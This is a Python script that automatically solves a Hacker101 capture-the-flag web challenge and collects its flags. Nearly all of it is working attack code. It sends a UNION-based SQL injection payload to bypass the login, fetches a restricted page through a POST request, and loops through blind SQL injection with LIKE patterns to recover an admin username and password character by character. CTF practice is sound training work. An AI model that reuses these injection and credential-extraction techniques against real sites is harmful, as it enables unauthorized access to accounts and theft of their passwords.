# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("[1] Enter your ctf id: ")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Delcaring Variable for username and password #
        payload = {'username': '', 'password': ''}
        # Printing Message before featching all flags #
        print("\033[32m[2] Please wait while we featch all flags.\033[0m")
        # Logging In without username and passsword to find first flag using SQL Injection #
        l2session = post_request(f'{ctf_url}/login', data={'username': "' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1", 'password': 'pass'}).cookies.get('l2session')
        # Adding flag from homepage #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/page/3", cookies = {'l2session': l2session}).text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/page/3", cookies = {'l2session': l2session}).text) else None}$FLAG$')
        # Adding flag which was on page 1 but forbidden but not for post request #
        FLAGS.append(post_request(f'{ctf_url}/page/edit/1').text)
        # Brute forcing username SQL Injection #
        print("\033[32m[3] Please wait brute forcing username. This may take 2-5minutes.\033[0m")
        # Looping 32 digits of username (username must be less than 32 characters) #
        for x in range(0, 32):
            # If we found out username's character it will be True else loop will break which means username found #
            match = False
            # Looping through alphabets to find correct alphabet for username charcter at index x #
            for letter in "abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                # Making a temp username which will be true username if username is alike #
                temp = payload['username']+letter
                # Checking If post request returns 200OK with Invalid Password which means username is correct #
                if search_flag("Invalid password", post_request(f'{ctf_url}/login', data = {"username": f"' or username LIKE '{temp}%", "password": 'temp'}).text):
                    # Changing current username to correct temp value #
                    payload['username'] = temp
                    # Setting Match True so loop continues checking for Username #
                    match = True
                    # Breaking loop because charcter at index x was found to be correct #
                    break
            # If match not found then username is found break outer loop #
            if match == False:
                break
        # # Brute forcing passwords SQL Injection #
        print("\033[32m[4] Found Username, Please wait brute forcing password. This may take 2-5minutes.\033[0m")
        # Looping 32 digits of password (password must be less than 32 characters) #
        for x in range(0, 32):
            # If we found out password's character it will be True else loop will break which means password found #
            match = False
            # Looping through alphabets to find correct alphabet for password charcter at index x #
            for letter in "abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                # Making a temp password which will be true password if password is alike #
                temp = payload['password']+letter
                # Checking If post request returns 200OK with Invalid Password which means password is correct #
                if search_flag("Invalid password", post_request(f'{ctf_url}/login', data = {"username": f"{payload['username']}' and password LIKE '{temp}%", "password": 'temp'}).text):
                    # Changing current password to correct temp value #
                    payload['password'] = temp
                    # Setting Match True so loop continues checking for password #
                    match = True
                    # Breaking loop because charcter at index x was found to be correct #
                    break
            # If match not found then password is found break outer loop #
            if match == False:
                break
        FLAGS.append(post_request(f'{ctf_url}/login', data=payload).text)
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m{str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[5] Your flags are: {FLAGS}\033[0m")